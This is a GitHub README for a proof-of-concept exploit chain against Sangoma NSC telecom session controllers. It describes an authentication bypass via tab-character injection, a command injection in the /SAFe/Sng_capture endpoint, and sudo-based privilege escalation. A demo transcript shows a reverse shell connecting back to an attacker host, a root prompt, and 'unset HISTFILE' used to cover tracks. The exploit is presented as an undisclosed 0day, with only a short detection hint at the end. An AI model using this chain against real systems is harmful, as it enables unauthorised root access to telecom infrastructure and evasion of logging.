# tabbypass-nsc-exploits
"Tab Bypass" Exploits for Sangoma NSC

This proof of concept exploit abuses three chained vulnerabilities to reliably spawn a root-shell on Sangoma NSC (Netborder Session Controller) systems. These are found in telco-land and supposedly provide a "security" function. 

Bug 1: "Tab Bypass" argument injection trickery enabling authentication bypass as an admin user in the web interface (affects NSC and NSG).  
Bug 2: Shell command injection in /SAFe/Sng_capture endpoint enabling shell command injection as the user "webconfig".  
Bug 3: One of many local privesc bugs caused by a comically insecure sudoers config that land us a root shell. In this case, we use sudo access to "nohup".  

Bug 3 can be swapped for any of several LPE exploits, this one just goes for a quick and easy win to launch a bash reverse shell as a proof of concept. More sophisticated exploits will be released eventually. 

This exploit is a proof of concept that demonstrates chaining these issues. A similar exploit for the NTG product is available in the [tabbypass-nsg-exploits](https://github.com/fullspectrumdev/tabbypass-nsg-exploits) repository. 

## Demo:  
```
# python3 tabbypass-nsc.py https://x.x.x.x:443 y.y.y.y 443
[+] Attempting to bypass authentication...
[*] Auth bypass succeeded, we can proceed...
[*] Using y.y.y.y:443 for connectback...
[+] starting handler on port 443
[+] Doing the command injection...
[*] Got connection from x.x.x.x
[$] Shell popped :P
bash: no job control in this shell
root@nsc SAFe 
# unset HISTFILE
unset HISTFILE
root@nsc SAFe 
# id
id
uid=0(root) gid=0(root) groups=0(root)
root@nsc SAFe 
# 
```

## Disclosure timeline:  
None. This is 0day dropped at BSides Basingstoke 2024.

## Detection: 
Still need to get around to writing a Snort or Suricata rule for this. However.  
POST requests to /index.php containing the POST variable "reserved_username" and a tab character in that post variable should detect it. 
